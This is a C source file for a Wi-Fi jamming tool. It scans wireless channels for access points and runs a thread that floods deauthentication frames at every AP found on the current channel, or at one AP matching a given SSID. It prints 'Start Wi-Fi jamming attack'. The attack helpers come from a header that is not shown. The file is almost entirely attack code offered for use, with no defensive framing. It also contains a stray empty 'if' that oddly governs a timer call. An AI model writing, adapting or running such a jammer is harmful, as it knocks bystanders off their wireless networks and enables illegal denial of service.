#include "wifi.h"

void *deauth_thread(void *arg);
void INTwifihandler(int sig);

int g_wifi_end_signal = 0;

int wifi_jammer(char* ifname, char* SSID, char* input_chan)
{
	int n, ret, chan, chan_fixd = 0;
	uint32_t chans[8]={0,};
    struct iw_dev dev;
    struct ap_info api;
	struct ap_list apl;
	struct timeval s_tv, n_tv;
	struct deauth_thread_args ta;
	suseconds_t msec;
	pthread_t thread_id;
	pthread_mutex_t list_mutex, ap_find_stop_mutex;
	

	iw_init_dev(&dev);
	strncpy(dev.ifname, ifname, sizeof(dev.ifname)-1);
    if(iw_dev_set(&dev)<0)
        return -1;

	if (input_chan == NULL)
	{
		for (n = 1; n<=13; n++)
			channel_set(chans,n);
		for (n = 36; n<=64; n+=4)
			channel_set(chans,n);
		for (n = 100; n<=140; n+=4)
			channel_set(chans,n);
		for (n = 149; n<=165; n+=4)
			channel_set(chans,n);

		chan = n = 0;
		do 
		{
			chan = (chan % CHANNEL_MAX) + 1;
			if (channel_isset(chans, chan))
				ret = iw_set_channel(&dev, chan);
			else
				ret = -1;
			/* 실패시 다음 채널 탐색 */
		} while(++n < CHANNEL_MAX && ret < 0);
		if (ret < 0)
			return -1;
	}
	else
	{
		chan = atoi(input_chan);
		if(chan <= 0 || chan > CHANNEL_MAX)
		{
			printf("Channel insert error\n");
			close(dev.fd_in);
			close(dev.fd_out);
			return -1;
		}
		if(iw_set_channel(&dev, chan)<0)
			return -1;

		chan_fixd = 1;
	}

	if(SSID!=NULL)
		printf("\n===== Start founding AP(\"%s\")... =====\n\n",SSID);	

	memset(&api, 0, sizeof(api));
	memset(&apl, 0, sizeof(apl));

	ta.apl = &apl;
	ta.dev = &dev;

	pthread_mutex_init(&list_mutex, NULL);
	ta.list_mutex = &list_mutex;
	pthread_mutex_init(&ap_find_stop_mutex, NULL);
	ta.ap_find_stop_mutex = &ap_find_stop_mutex;
	ta.ap_find_stop = 0;

	ta.SSID = SSID;

	signal(SIGINT, INTwifihandler);

	pthread_create(&thread_id, NULL, deauth_thread, &ta);

	if(input_chan != NULL)

	gettimeofday(&s_tv, NULL);

	while(!g_wifi_end_signal && !ta.ap_find_stop)
	{		
		if(!get_ap_info(&dev, &api))
        {
            if(input_chan == NULL)
			{
                pthread_mutex_lock(&list_mutex);
				add_ap(&apl, &api);
				pthread_mutex_unlock(&list_mutex);
			}
            else
            {
                if(api.chan == dev.chan)
				{
					pthread_mutex_lock(&list_mutex);
					add_ap(&apl, &api);
					pthread_mutex_unlock(&list_mutex);
				}
            }    
        }

		gettimeofday(&n_tv, NULL);
		if(n_tv.tv_usec > s_tv.tv_usec)
			msec = n_tv.tv_usec - s_tv.tv_usec;
		else
			msec = s_tv.tv_usec - n_tv.tv_usec;
		
		if (msec >= 100000 && !chan_fixd)
		{
			n = 0;
			do {
				chan = (chan % CHANNEL_MAX) + 1;
				if (channel_isset(chans, chan))
					ret = iw_set_channel(&dev, chan);
				else
					ret = -1;
			} while(++n < CHANNEL_MAX && ret < 0);
			if (ret < 0) 
				return -1;
			gettimeofday(&s_tv, NULL);
		}
	}
	pthread_join(thread_id, NULL);
	printf("\nExiting...\n");
	pthread_mutex_destroy(&list_mutex);
	iw_dev_unset(&dev);
	free_ap_list(&apl);

    return 0;
}

void *deauth_thread(void *arg)
{
	struct deauth_thread_args *ta = arg;
	struct access_point *ap, *tmp;
	struct timeval p_tv, p_tv2;
	suseconds_t msec;
	
	gettimeofday(&p_tv, NULL);
	if(ta->SSID == NULL)
	{
		clear_scr();
   	 	update_scr(ta->apl, ta->dev);
	}
	while (!g_wifi_end_signal)
	{
		ap = ta->apl->head;
		while(ap != NULL && !g_wifi_end_signal)
		{
			if(ta->SSID == NULL)
			{
				gettimeofday(&p_tv2, NULL);
				if (p_tv2.tv_usec > p_tv.tv_usec)
					msec = p_tv2.tv_usec - p_tv.tv_usec;
				else
					msec = p_tv.tv_usec - p_tv2.tv_usec;

				if (msec >= 500000) 
				{
					update_scr(ta->apl, ta->dev);
					gettimeofday(&p_tv, NULL);
				}
				if(ap->info.chan == ta->dev->chan)
					send_deauth(ta->dev, ap);
			}
			else
			{
				if(!strcmp(ap->info.essid, ta->SSID))
				{
					printf("\"%s\" found AP!!\n\n",ap->info.essid);
					printf("===== Start Wi-Fi jamming attack... (\"%s\"[CH:%d]) =====\n\n",ta->SSID, ap->info.chan);

					pthread_mutex_lock(ta->ap_find_stop_mutex);
					ta->ap_find_stop =1;
					iw_set_channel(ta->dev, ap->info.chan);
					pthread_mutex_unlock(ta->ap_find_stop_mutex);

					while(!g_wifi_end_signal)
						send_deauth(ta->dev, ap);
				}
			}
			ap = ap->next;
		}
	}
	return NULL;
}

void INTwifihandler(int sig)
{
    signal(sig, SIG_IGN);

    g_wifi_end_signal = 1;
}
